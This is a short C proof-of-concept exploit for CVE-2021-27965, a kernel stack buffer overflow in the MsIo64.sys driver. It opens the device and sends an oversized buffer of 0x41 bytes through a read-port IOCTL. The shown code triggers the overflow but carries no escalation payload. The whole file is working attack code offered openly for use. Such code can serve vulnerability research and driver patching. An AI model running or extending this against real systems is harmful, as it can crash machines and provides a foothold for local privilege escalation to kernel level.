#include "exploit.h"

int main(int argc, char** argv)
{
	HANDLE h_driver = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	unsigned char unused = 0;

	SetConsoleTitleA("CVE-2021-27965");

	printf("[*] MsIo64.sys Kernel Stack-based Buffer Overflow Local Privilege Escalation\n[*] Exploit written by ExAllocatePool2\n[!] Let's exploit!");

	if (h_driver == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a handle to the device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the device driver. Handle Value: 0x%p", h_driver);

	unsigned char input[52];
	unsigned char output[2048];
	unsigned long bytes_returned = 0;

	memset(&input, 0x41, sizeof(input));
	DeviceIoControl(h_driver, IOCTL_MSIO_READPORT, &input, sizeof(input), &output, sizeof(output), &bytes_returned, 0);

	printf("\n[+] Exploit completed.");
	unused = getchar();
	return 0;
}